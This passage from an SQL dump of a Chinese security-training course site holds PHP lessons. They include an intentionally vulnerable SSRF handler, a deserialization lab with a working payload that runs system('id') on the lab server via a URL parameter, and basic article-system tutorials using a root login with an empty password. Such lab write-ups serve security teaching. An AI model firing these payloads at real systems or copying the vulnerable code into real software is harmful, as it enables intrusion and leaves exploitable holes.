class=\"hljs-string\">\"submit\"</span>&gt;\r\n\r\n&lt;/form&gt;\r\n\r\n&lt;/body&gt;&lt;/html&gt;\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span> \r\n\r\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">isset</span>($_POST[<span class=\"hljs-string\">\'url\'</span>]))\r\n\r\n{\r\n\r\n$link = $_POST[<span class=\"hljs-string\">\'url\'</span>];\r\n\r\n$filename = <span class=\"hljs-string\">\'./ssrf/\'</span>.rand().<span class=\"hljs-string\">\'txt\'</span>;\r\n\r\n$curlobj = curl_init($link);\r\n\r\n$fp = fopen($filename,<span class=\"hljs-string\">\"w\"</span>);\r\n\r\ncurl_setopt($curlobj, CURLOPT_FILE, $fp);\r\n\r\ncurl_setopt($curlobj, CURLOPT_HEADER, <span class=\"hljs-number\">0</span>);\r\n\r\ncurl_exec($curlobj);\r\n\r\ncurl_close($curlobj);\r\n\r\nfclose($fp);\r\n\r\n$fp = fopen($filename,<span class=\"hljs-string\">\"r\"</span>);\r\n\r\n$result = fread($fp, filesize($filename)); \r\n\r\nfclose($fp);\r\n\r\n<span class=\"hljs-keyword\">echo</span> $result;\r\n\r\n}\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>上面的代码非常简单通过post得到url的数据然后做了一系列curl和文件相关的操作。上面的代码由于没有对错误信息做任何处理所以会直接返回端口相关的banner信息。在实际的测试中服务端可能会对错误信息做处理。这时候只要细心多观察返回的结果已经返回的数据包大小，响应时间等都会得到想要的结果。\r\n</p><p></p><p>关于为什么使用fopen&nbsp;curl&nbsp;socket这类函数会得到banner信息。原因是这类链接用的tcp链接，tcp链接的时候本身会发送banner信息。\r\n</p><p><br></p>',1,'<p>1</p>'),(48,'php反序列化基础训练','通过部署虚拟环境来实战训练php反序列化漏洞','<h2><span style=\"font-size: 14px;\">1）通过部署课程访问如下连接得到实验环境</span></h2><p><span style=\"font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; font-size: inherit; line-height: 1.5; white-space: pre-wrap; background-color: rgb(248, 248, 248);\">http://**** /unserialize.php</span>。实验环境截图如下</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:310.5pt;\r\n height:79.5pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\KUX_%60U~%60WPB@%7bS9Y)D)(Q%7dM.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/uns1.png\" style=\"line-height: 1; max-width: 100%;\" class=\"\"></v:imagedata></v:shape></v:shapetype></p><p>2）在自己本地搭建的php环境中构造一段代码生成一个序列化poc。具体代码如下：</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//poc.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">Class</span> <span class=\"hljs-title\">PHPunserialize</span></span>{\r\n\r\n<span class=\"hljs-keyword\">Public</span> $unserialize=”system(‘id’);”;\r\n\r\n}\r\n\r\n$poc=serialize(<span class=\"hljs-keyword\">new</span> PHPunserialize);\r\n\r\n<span class=\"hljs-keyword\">Echo</span> $poc;\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>在自己的环境汇总运行上面的php代码得到如下poc:</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">O:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"PHPunserialize\"</span>:<span class=\"hljs-number\">1</span>:{s:<span class=\"hljs-number\">11</span>:<span class=\"hljs-string\">\"unserialize\"</span>;s:<span class=\"hljs-number\">13</span>:<span class=\"hljs-string\">\"system(\'id\');\"</span>;}</code></pre><p>3)\r\n使用上面得到的poc访问http://**** /unserialize.php。具体方式如下：</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">http:<span class=\"hljs-comment\">//****/unserialize.php?r=O:14:\"PHPunserialize\":1:{s:11:\"unserialize\";s:13:\"system(%27id%27);\";}</span></code></pre><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:723.75pt;height:68.25pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:href=\"file:///C:\\Users\\test\\AppData\\Roaming\\Tencent\\Users\\2022137639\\QQ\\WinTemp\\RichOle\\A%603F$4DS(O507BTFQIUH1@8.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/uns2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看到执行了linux命令，达到了攻击的目的。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/unss.jpg','daocloud.io/catteam/ssrfunserialize:master-112a365','2016-10-08 18:01:53',1,NULL,'<h2><span style=\"font-size: 14px;\">1）Php反序列化漏洞原理分析</span><br></h2><p>Php中通过serialize() 把变量和它们的值编码成文本形式在变量中进行传递，然后通过unserialize() 恢复原先变量。当对一个对象进行反序列化操作时，PHP会自动地调用其__wakeUp()等魔幻方法。这样就使得对象能够重新建立起序列化时未能保留的各种状态。例如：数据库连接等。但是如果对序列化的对象不精细任何过滤。恶意攻击者会精心构造特殊的对象，这样使得反序列化以后的代码就有可能造成远程代码执行从而威胁系统安全。</p><p>2）源码分析</p><p>//unserialize.php</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image003.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/uns3.png\"></p><p>通过上面的代码我们可以知道$_REQUEST得到参数r的值以后。由于传进来的值中有new 一个类的对象，所以自动调用了类中的魔幻函数。执行了eval造成system函数的代码执行最终在服务端执行了linux的shell命令。</p><p>3）php魔幻函数的总结</p><pre>__construct(),&nbsp;__destruct(),&nbsp;__call(),&nbsp;__callStatic(),&nbsp;__get(),&nbsp;__set(),&nbsp;__isset(),&nbsp;__unset(),&nbsp;__sleep(),&nbsp;__wakeup(),&nbsp;__toString(),&nbsp;__invoke(),&nbsp;__set_state(),&nbsp;__clone(),&nbsp;and&nbsp;__autoload().<o:p></o:p></pre><p></p><p>其中最常见的魔幻函数就是构造函数和析构函数。</p><p><br></p>',1,'<p>1</p>'),(49,'php基础课程一','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）先部署系统看熟悉一下系统的功能</span><br></h2><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:321.75pt;height:175.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>上面的是虚拟环境中的系统首页，看起来很难看，这主要是我们使用了原生的php来写的，没有加任何css和js效果。等到下一阶段的php训练课程我们会将mvc模式以及php的框架。到时候大家可以对比一下加了前端效果的界面和这个界面的不同之处。</p><p>这里我们主要看功能，以便快速学习php的基础语法信息。所以就不讨论丑与美的问题了。</p><p>2）功能熟悉</p><p>&nbsp;<v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:187.5pt;height:131.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:187.5pt;height:131.25pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p3.png\"><br></v:imagedata></v:shape></p><p><v:shape type=\"#_x0000_t75\" style=\"width:187.5pt;height:131.25pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/p4.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:361.5pt;height:150pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:405.75pt;height:114pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\"></v:imagedata></v:shape></p><p>登陆账号密码为：mmc 123456</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:6in;height:44.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>这个相当于管理员首页。点击manager可以管理文章</p><p><v:shape id=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:389.25pt;height:147pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>我们增加一个文章看看。点击增加即可</p><p><v:shape id=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:374.25pt;height:237.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p7.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>点击提交以后就可以在首页看到新添加的文章了。</p><p><v:shape id=\"_x0000_i1032\" type=\"#_x0000_t75\" style=\"width:372.75pt;height:298.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p8.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1033\" type=\"#_x0000_t75\" style=\"width:376.5pt;height:147pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p9.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>文章修改，删除什么的都可以使用。这就是一个最基本的文章管理系统。Php基础课程的系列课程就是通过这个简单的文章管理系统来熟悉php语言。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:41:17',1,NULL,'<h2><span style=\"font-size: 14px;\">我们通过线上的编程环境来实现这个文章管理系统。进而学习一下php课程。</span><br></h2><p>1）先进入线上编程环境</p><p><a href=\"http://%2A%2A%2A%2A/Codiad\">http://****/Codiad</a>&nbsp;进入这个链接，页面如下</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image013.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p10.png\"></p><p>输入相关的信息。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p11.png\"></p><p>然后点击install。过一会就出现登录界面，输入刚才install时的账号密码</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image015.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p12.png\"></p><p>登陆成功以后就可以在刚才 创建的项目中添加文件以及文件夹了。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image016.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p13.png\"></p><p>我们创建一个index.php文件看下</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image017.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p14.png\"></p><p>然后我们可以通过下面的目录结构访问这个index.php</p><p><a href=\"http://%2A%2A%2A%2A/Codiad/workspace/test/index.php\">http://****/Codiad/workspace/test/index.php</a></p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/p15.png\"></p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image019.jpg\"></p><p>这就是我们刚才创建的index.php文件。</p><p>2）一些说明</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>1</p>'),(50,'php基础课程二','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><span style=\"font-size: 14px;\">1）在线上编程环境中输入一下代码</span><br></h2><p>/首先这个系统是需要连接数据库的。所以我们先把配置文件写好。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:120pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>然后我们建立一个数据库连接文件，如下图</p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:248.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>最后我们建立一个首页显示的index.php文件</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:177.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p23.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>然后我们访问index.php文件。注意访问路径</p><p><a href=\"http://*****/Codiad/workspace/test/index.php\">http://*****/Codiad/workspace/test/index.php</a></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:69pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p24.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>我们发现index.php可以访问但是没有任何内容。因为我们还没添加文章。这证明这个页面现在是可以访问的。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:41:55',1,NULL,'<h2><span style=\"font-size: 14px;\">1）源码分析</span><br></h2><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//config.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\nheader(<span class=\"hljs-string\">\"Content-type:text/html;charset=utf-8\"</span>);\r\n\r\ndefine(<span class=\"hljs-string\">\'HOST\'</span>,<span class=\"hljs-string\">\'127.0.0.1\'</span>);\r\n\r\ndefine(<span class=\"hljs-string\">\'USERNAME\'</span>,<span class=\"hljs-string\">\'root\'</span>);\r\n\r\ndefine(<span class=\"hljs-string\">\'PASSWORD\'</span>,<span class=\"hljs-string\">\'\'</span>);  <span class=\"hljs-comment\">//定义密码为空</span>\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>Php语言开始的标签为&lt;?php 这个地方可以写php代码?&gt;</p><p>每行代码以分号（；）结束</p><p>Header()函数表示设置页面显示的类型以及格式。正常情况下国际通用的一般都是utf-8编码。在国内很多也使用gbk gb2312编码。</p><p>define(\'HOST\',\'127.0.0.1\'); 定义HOST的值为127.0.0.1 ，以后可以直接用此处定义的变量来代替此处的值，在使用这个变量的时候只需要包含这个页面就可以了。这个就是定义数据的地址为本机127.0.0.1代表本机。如果数据在远程服务器可以修改此处为其它的地址 比如192.168.0.2等等。</p><p>Config.php中代码就是用来定义数据库连接的主机，用户名，密码。</p><p>Php中的注释有两种第一种为 //需要注释的内容&nbsp;&nbsp; 第二种为/*需要注释的内容*/</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p25.png\"></p><p>注释表示在代码中用来辅助说明，实际并不起任何作用。这节我们就先讲config.Php文件。下节课我们继续</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>2</p>'),(51,'php基础课程三','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><font size=\"3\">1）在线上编程环境中输入一下代码</font></h2><p>/首先这个系统是需要连接数据库的。所以我们先把配置文件写好。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p21.png\"></p><p>然后我们建立一个数据库连接文件，如下图</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p22.png\"></p><p>最后我们建立一个首页显示的index.php文件</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p23.png\"></p><p>然后我们访问index.php文件。注意访问路径</p><p><a href=\"http://%2A%2A%2A%2A%2A/Codiad/workspace/test/index.php\">http://*****/Codiad/workspace/test/index.php</a></p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p24.png\"></p><p>我们发现index.php可以访问但是没有任何内容。因为我们还没添加文章。这证明这个页面现在是可以访问的。</p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:42:14',1,NULL,'<p>1）源码分析</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//connect.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-comment\">/*连接数据库并创建test1数据库*/</span>\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'config.php\'</span>); <span class=\"hljs-comment\">//包含之前的数据库连接文件，以便使用之前定义的变量</span>\r\n\r\n$con=mysql_connect(HOST,USERNAME,PASSWORD);\r\n\r\nmysql_query(<span class=\"hljs-string\">\'create database test1\'</span>);\r\n\r\nmysql_query(<span class=\"hljs-string\">\'set names utf8\'</span>);\r\n\r\nmysql_select_db(<span class=\"hljs-string\">\'test1\'</span>);\r\n\r\n$article=<span class=\"hljs-string\">\"CREATE TABLE `article` (\r\n\r\n  `id` int(10) NOT NULL AUTO_INCREMENT,\r\n\r\n  `title` varchar(20) DEFAULT NULL,\r\n\r\n  `author` varchar(10) DEFAULT NULL,\r\n\r\n  `description` varchar(30) DEFAULT NULL,\r\n\r\n  `content` varchar(255) DEFAULT NULL,\r\n\r\n  `dateline` varchar(20) DEFAULT NULL,\r\n\r\n  PRIMARY KEY (`id`)\r\n\r\n)ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8\"</span>;\r\n\r\n$user=<span class=\"hljs-string\">\"CREATE TABLE `users` (\r\n\r\n  `user_id` int(10) NOT NULL AUTO_INCREMENT,\r\n\r\n  `user_name` varchar(20) DEFAULT NULL,\r\n\r\n  `user_pwd` varchar(32) DEFAULT NULL,\r\n\r\n  `user_email` varchar(30) DEFAULT NULL,\r\n\r\n  `user_info` varchar(255) DEFAULT NULL,\r\n\r\n  `user_tele` varchar(20) DEFAULT NULL,\r\n\r\n  PRIMARY KEY (`user_id`)\r\n\r\n)ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8\"</span>;\r\n\r\nmysql_query($article,$con);\r\n\r\nmysql_query($user,$con);\r\n\r\n<span class=\"hljs-meta\">?&gt;</span></code></pre><p>Require_once()函数可以用来包含需要的文件。文件包含以后就可以使用所包含文件中的变量，函数等。Php中文件包含的函数总共有4个分别为：require() ,include(),\r\nrequire_once(),include_once()。关于这4个函数的区别学员可以网上查阅一下。搞清楚。</p><p>$con 表示定义一个临时编码。Php中所有临时变量的定义都是以$开头。 mysql_connect（）连接数据库函数，三个参数分别为数据库地址，数据库连接用户名，数据库连接密码。mysql_select_db(\'test\')表示选择数据库中的test数据库。mysql_query(\'set\r\nnames utf8\')表示设置数据库的编码为utf-8这个编码原则上要和页面显示的编码一致。关于数据库方面的知识可以查看数据库相关的课程或者网上搜索数据库的基础知识学习。</p><p>下节课我们继续</p><p>2）注意</p><p></p><p>上面我们通过图示的方式告诉怎么进入线上编程环境。需要注意的是，每次重新部署以后所有环境都会重置，所以希望学员在学习的时候吧编写好的代码，存在本地。</p><p><br></p>',1,'<p>3</p>'),(52,'php基础课程四','php基础编程，通过一个简单的php系统，来说明php语言的用法以及各种基础知识。','<h2><font size=\"3\">1）在线上编程环境中输入一下代码</font></h2><p>/首先这个系统是需要连接数据库的。所以我们先把配置文件写好。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p21.png\"></p><p>然后我们建立一个数据库连接文件，如下图</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p22.png\"></p><p>最后我们建立一个首页显示的index.php文件</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p23.png\"></p><p>然后我们访问index.php文件。注意访问路径</p><p><a href=\"http://%2A%2A%2A%2A%2A/Codiad/workspace/test/index.php\">http://*****/Codiad/workspace/test/index.php</a></p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/p24.png\"></p><p>我们发现index.php可以访问但是没有任何内容。因为我们还没添加文章。这证明这个页面现在是可以访问的。</p><p><br></p><p><br></p>',4,'http://oda8mr8yr.bkt.clouddn.com/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB3.jpg','daocloud.io/catteam/phpcodiad:master-ce6f50c','2016-10-10 14:42:41',1,NULL,'<p>1）源码分析</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span class=\"hljs-comment\">//index.php</span>\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\'connect.php\'</span>);\r\n\r\n$query=mysql_query(<span class=\"hljs-string\">\'select * from article order by dateline desc\'</span>);\r\n\r\n<span class=\"hljs-keyword\">while</span>($row=mysql_fetch_assoc($query)){\r\n\r\n    $data[]=$row;\r\n\r\n}\r\n\r\n \r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;!doctype html&gt;\r\n\r\n&lt;html lang=<span class=\"hljs-string\">\"en\"</span>&gt;\r\n\r\n&lt;head&gt;\r\n\r\n    &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\r\n\r\n    &lt;title&gt;Document&lt;/title&gt;\r\n\r\n&lt;/head&gt;\r\n\r\n&lt;body&gt;\r\n\r\n<span class=\"hljs-meta\">&lt;?php</span>\r\n\r\n<span class=\"hljs-keyword\">foreach</span>($data <span class=\"hljs-keyword\">as</span> $value) {\r\n\r\n<span class=\"hljs-meta\">?&gt;</span>\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:300px; height:30px; background:#80FFFF;\"</span>&gt;标题：<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $value[<span class=\"hljs-string\">\'title\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/div&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:300px; height:30px; background:#FFA042;\"</span>&gt;作者：<span class=\"hljs-meta\">&lt;?php</span> <span class=\"hljs-keyword\">echo</span> $value[<span class=\"hljs-string\">\'author\'</span>]<span class=\"hljs-meta\">?&gt;</span>&lt;/div&gt;\r\n\r\n&lt;div style=<span class=\"hljs-string\">\"width:300px; height:30px; 